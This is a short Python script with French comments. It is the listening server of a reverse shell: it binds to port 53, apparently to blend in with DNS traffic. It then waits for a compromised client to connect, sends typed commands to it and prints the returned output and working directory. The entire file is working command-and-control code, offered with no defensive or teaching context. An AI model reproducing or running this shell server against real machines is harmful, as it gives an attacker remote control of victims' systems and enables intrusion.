import socket

host = socket.gethostbyname(socket.gethostname())
port = 53

buffer = 1024*512

separator = "<sep>"

#créer le recepteur
s = socket.socket()

#régler le port
s.bind((host, port))

s.listen(5)
print(f"A l'écoute sur {host}:{port}")

#accpeter les connections
clientSocket, clientAdress = s.accept()
#print(f"{clientSocket[0]}:{clientAdress[1]} Connected!")
cwd = clientSocket.recv(buffer).decode()
while True:
    
    command = input(f"{cwd}$>")
    if not command.strip():
        continue
    clientSocket.send(command.encode())
    if command.lower() == "exit":
        break
    output = clientSocket.recv(buffer).decode()
    result, cwd = output.split(separator)
    result = result.replace("ÿ", " ")
    result = result.replace(",", "é")
    print(result)
